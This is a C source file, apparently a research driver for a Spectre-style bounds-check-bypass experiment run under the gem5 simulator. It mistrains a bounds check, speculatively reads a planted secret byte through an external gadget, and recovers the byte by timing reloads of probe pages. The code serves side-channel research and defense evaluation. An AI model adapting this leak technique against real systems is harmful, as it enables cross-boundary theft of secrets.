/*
 * jmp-shadow probe driver (SpecLFB), 2026-11-08.
 * usage: driver <secret 1..15>
 * Trains the gadget's bounds check with in-bounds x, then calls it once with
 * x pointing at the secret byte. Every call uses a fresh, never-touched bound
 * line (one per page; the page's TLB entry is warmed through another line), so
 * the bounds check stays unresolved for a full miss. After the squash it times
 * a reload of each probe slot (rdtsc) and prints the result; the gem5 Cache
 * debug trace of the same reloads is the second (cycle-exact) observer.
 * Probe slot 0 is touched by training (array1[0..15] = 0), so secrets are 1..15.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define NSLOT 16
#define PSTRIDE 4096
#define NTRAIN 12

uint8_t probe[NSLOT * PSTRIDE] __attribute__((aligned(4096)));
/* bound lines: statically 16, never written at run time (cold at first use) */
uint64_t sizes[NTRAIN + 1][512] __attribute__((aligned(4096))) =
    { [0 ... NTRAIN] = { [0 ... 511] = 16 } };
uint8_t array1[64] __attribute__((aligned(64)));
uint8_t secret_area[64] __attribute__((aligned(64)));
volatile uint64_t sink;

extern void gadget(uint64_t x, uint64_t *sizep, uint8_t *array1, uint8_t *probe);

static inline uint64_t rdtsc(void)
{
    uint32_t lo, hi;
    __asm__ volatile("mfence; lfence; rdtsc; lfence" : "=a"(lo), "=d"(hi) :: "memory");
    return ((uint64_t)hi << 32) | lo;
}

int main(int argc, char **argv)
{
    int secret = argc > 1 ? atoi(argv[1]) : 5;
    int i;
    secret_area[0] = (uint8_t)secret;
    for (i = 0; i < 64; i++)
        array1[i] = 0;
    sink += secret_area[0] + array1[1];
    /* warm the TLB for every probe page and bound page via a line we never measure */
    for (i = 0; i < NSLOT; i++)
        sink += probe[i * PSTRIDE + 2048];
    for (i = 0; i <= NTRAIN; i++)
        sink += sizes[i][256];
    uint64_t mal = (uint64_t)(secret_area - array1);
    __asm__ volatile("mfence" ::: "memory");
    for (i = 0; i <= NTRAIN; i++) {
        uint64_t x = (i < NTRAIN) ? (uint64_t)(i & 15) : mal;
        gadget(x, &sizes[i][0], array1, probe);
    }
    __asm__ volatile("mfence; lfence" ::: "memory");
    uint64_t t[NSLOT];
    for (i = 0; i < NSLOT; i++) {
        uint64_t t0 = rdtsc();
        sink += *(volatile uint8_t *)&probe[i * PSTRIDE];
        uint64_t t1 = rdtsc();
        t[i] = t1 - t0;
    }
    for (i = 0; i < NSLOT; i++)
        printf("JMPSHADOW secret=%d slot=%d cycles=%lu\n", secret, i, (unsigned long)t[i]);
    return (int)sink;
}
